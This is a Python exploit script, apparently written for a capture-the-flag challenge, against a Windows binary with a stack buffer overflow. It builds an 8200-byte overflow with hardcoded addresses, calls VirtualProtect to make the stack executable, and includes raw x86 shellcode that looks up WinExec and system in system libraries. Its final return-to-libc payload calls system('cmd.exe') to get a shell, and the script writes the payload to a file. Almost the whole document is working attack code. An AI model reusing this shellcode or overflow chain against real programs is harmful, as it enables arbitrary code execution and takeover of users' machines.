""" First open Executable on IDA after tests we find to overflow EIP we need 8220 caracter but care for the file pointer 
so we dont generate segfault because of fclose function . + the  stack is not executable so we opt for a winExec on KERNEL32.dll or system() on mscvrt.dll 
since it s not imported we need to inject some code but i prefer not to search for the adress of system() manually 
(WinExec didnt work well with wrapper ) , i used VirutalProtect() to change the area of the stack to permission PAGE_EXECUTE_READWRITE 
and i injected my shellcode to find the adress of system() then i did another payload to craft the call to system and GOT the flag """


import struct

buf = b"\x41"*8200
file_pointer=struct.pack("I", 0x75A75660)

padding_to_eip="\xf1\x16\x40\x00"+"\x17\x00\x00\x00"+"\xa8\xfe\x65\x00"

Eip=struct.pack("I",0x74dd0c10) # Adress of VirtualProtect()

adressofShellcode=struct.pack("I", 0x771c4db1) #push esp ret

adressofprintf=struct.pack("I",0x75a36020)#Another thought if we can print the caracters of the file we win 



pagetochangetoexecute=struct.pack("I",0x65c000)# Change the whole stack to executable 

file_pointer="\x00\x00\x00\x00"

system=struct.pack("I", 0x74c04fb0) # Adresse of System() in mscvrt.dll

WinExec=struct.pack("I", 0x74e0d220) # Adress of WinExec but didnt work with wrapper 

Cmd_exe=struct.pack("I",0x65fe88) # Adress of String cmd.exe

StringCmdexe="\x63\x6d\x64\x2e"+"\x65\x78\x65\x20\x00" 

######Shellcode to Find Adress of Winexec And execute it (Look for base of Kernel32.dll and look for offset of WinExec)

shellcode=[
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08"
,"\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
,"\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
,"\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08"
,"\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c"
,"\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9"
,"\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49"
,"\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65"
,"\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d"
,"\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x68\x65\x78\x65"
,"\x20\x68\x63\x6d\x64\x2e\x89\xe1\x51\xff\xd7\x31\xc9"
,"\x51\xff\xd6"]

######Shellcode to find adress of System Break before end it doesnt Execute it (Look for base of mscvrt.dll and look for offset of System)

shellcode=[
"\x89\xe5\x83\xec\x30\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b"
,"\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7"
,"\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53"
,"\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\xe8\x31\xc9\xfc\x8b"
,"\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x0f\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4"
,"\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\x31\xc0\x66\xb8\x73\x73\x50"
,"\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x89\x65\xe8\xe8\xb0\xff"
,"\xff\xff\x89\x45\xe4\x31\xd2\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f"
,"\x61\x64\x54\xff\x75\xfc\x8b\x45\xe4\xff\xd0\x89\x45\xe0\x31\xc0\x66\xb8\x72\x74\x50"
,"\x68\x6d\x73\x76\x63\x54\x8b\x5d\xe0\xff\xd3\x89\x45\xdc\x31\xd2\x66\xba\x65\x6d\x52"
,"\x68\x73\x79\x73\x74\x54\xff\x75\xdc\x8b\x45\xe4\xff\xd0\x89\x45\xd8\x31\xc9\x66\xb9"
]

shellcode='\x90'*50+''.join(shellcode)
NewPr=b"\x40\x00\x00\x00" #Newprotect 0x00000040
Oldpr=b"\x80\xde\x65\x00" #Oldprotect Variable to stock old constant value (Anything on the stack writable )

size=b"\xFF\x3F\x00\x00" # size basicly the size of the whole stack 


##### First Exploit look for adress of system
#buf+=file_pointer+padding_to_eip+Eip+adressofShellcode+pagetochangetoexecute+size+NewPr+Oldpr+shellcode







#### Seconde Exploit the target and get a shell 

buf+=file_pointer+padding_to_eip+system+'\xa1\x18\x40\x00'+Cmd_exe+StringCmdexe
with open("Gitano","wb") as f:
    f.write(buf)

